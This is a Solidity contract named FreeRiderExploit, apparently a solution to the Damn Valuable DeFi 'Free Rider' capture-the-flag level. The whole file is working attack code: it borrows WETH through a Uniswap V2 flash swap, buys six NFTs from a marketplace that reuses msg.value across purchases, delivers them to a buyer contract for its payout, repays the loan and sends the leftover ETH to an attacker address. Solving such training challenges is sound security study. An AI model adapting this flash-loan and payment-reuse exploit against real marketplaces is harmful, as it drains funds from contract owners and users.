// SPDX-License-Identifier: MIT

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

pragma solidity ^0.8.0;

interface IWETH9 {
    function deposit() external payable;

    function withdraw(uint wad) external;

    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {
    FreeRiderBuyer private immutable buyer;
    FreeRiderNFTMarketplace private immutable marketplace;
    DamnValuableNFT private immutable nft;
    IUniswapV2Pair private immutable pair;
    IWETH9 private immutable weth;
    address private immutable attacker;

    constructor(
        address _buyer,
        address payable _marketplace,
        address _nft,
        address _pair,
        address _weth,
        address _attacker
    ) {
        buyer = FreeRiderBuyer(_buyer);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        weth = IWETH9(_weth);
        pair = IUniswapV2Pair(_pair);
        attacker = _attacker;
    }

    function exploit(uint _perNFTCost) external {
        bytes memory data = abi.encode(0);
        pair.swap(_perNFTCost, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: amount0}(tokenIds);

        for (uint i = 0; i < 6; ++i) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }

        // about 0.3% fee, +1 to round up
        uint fee = (amount0 * 3) / 997 + 1;
        uint amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

        attacker.call{value: address(this).balance}("");
    }

    receive() external payable {}

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
